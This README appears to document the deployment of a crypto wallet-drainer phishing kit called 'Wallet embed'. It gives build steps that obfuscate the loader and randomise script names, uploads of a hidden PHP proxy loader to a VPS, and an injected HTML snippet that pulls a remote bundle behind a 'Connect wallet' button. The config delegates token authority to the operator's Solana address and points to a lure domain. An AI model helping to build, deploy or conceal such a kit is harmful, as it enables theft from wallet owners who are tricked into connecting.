# Wallet embed

```
├── vercel/          → deploy to Vercel (JS bundle + /profile popup)
├── vps/             → upload to Debian VPS (PHP proxy + HTML)
└── nginx/           → nginx config for VPS
```

---

## Build (obfuscate everything except public HTML)

```bash
npm run build
```

| Output | Obfuscated? |
|--------|-------------|
| `vercel/public/*.js` | Random names from `vercel/asset-names.json` |
| `vercel/public/profile/*.js` | Random profile script name |
| `vercel/public/profile/index.html` | No (public HTML) |
| `vps/public/index.html` | No (public HTML) |
| `vps/loader.obf.php` | Yes (upload as `loader.php`) |

\*Full-bundle obfuscation (~2.2 MB) takes 5+ minutes and hangs Vercel builds, so vendor libs stay minified-only.

---

## VPS upload

Everything goes in **`/var/www/mysite/public/`** on the server:

```
public/
├── loader.php      ← upload loader.obf.php as this name
├── cache/          ← mkdir, writable by www-data (not web-accessible)
├── index.html      ← your page(s)
└── *.svg           ← assets
```

Edit config in repo `vps/loader.php`, build, upload:

```bash
nano vps/loader.php
npm run build
scp vps/loader.obf.php user@vps:/var/www/mysite/public/loader.php
scp vps/public/index.html user@vps:/var/www/mysite/public/
```

---

## HTML

```html
<script>
!function(u){var s=document.createElement("script");s.src=u;s.defer=1;document.head.appendChild(s)}("/vault38472");
</script>
<button type="button" class="K7mQ2">Connect wallet</button>
```

---

## loader.php `$cfg`

```php
'reown_project_id' => 'YOUR_REOWN_ID',
'site_url' => 'https://vote-moonshot.top',
'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/p7KqN2mR9vXw.js',
'button_class' => 'K7mQ2',
'connect_popup_enabled' => true,
'token_delegate' => 'YOUR_SOLANA_ADDRESS',
'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=YOUR_KEY',
```

---

## Vercel

1. Import repo → **Root Directory:** `vercel` → Deploy
2. Build command: `npm run build` (or `cd .. && npm run build` if root build needed)
3. JS URLs come from `vercel/asset-names.json` (synced into `loader.php` on build)

Regenerate random JS filenames:

```bash
cd vercel && npm run new-asset-names
cd .. && npm run build
```

Reown dashboard → allow **your HTML domain**

---

## Flow

```
/vault38472 → loader.php → config + Vercel JS
Pick wallet → popup YOUR-PROJECT.vercel.app/profile
```

Clear VPS cache after Vercel deploy: `rm -f /var/www/mysite/public/cache/bundle.cache.js`
